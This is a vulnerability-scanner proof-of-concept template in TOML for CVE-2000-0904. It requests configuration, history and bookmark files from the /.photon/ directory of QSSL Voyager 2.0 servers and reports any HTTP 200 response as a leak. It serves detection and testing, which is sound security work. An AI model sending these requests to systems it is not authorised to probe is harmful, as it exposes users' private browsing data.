[info]
author = "AVE"
description = "通过访问 Voyager Web 服务器 /.photon/ 目录下的敏感文件，验证是否存在信息泄露漏洞。远程攻击者可读取 Web 客户端配置、历史记录、书签等敏感信息。"
id = "POC-AVE-2000-0659"
name = "QSSL Voyager 2.0 .photon Directory Information Disclosure PoC"
severity = "medium"
tags = [
    "cve-2000-0904",
    "information-disclosure",
    "qnx",
    "voyager",
]
vuln_id = [
    "CVE-2000-0904",
    "AVE-2000-0659",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/.photon/voyager/config.full"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/.photon/voyager/history.html"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/.photon/voyager/hotlist"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/.photon/pwm/pwm.menu"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"
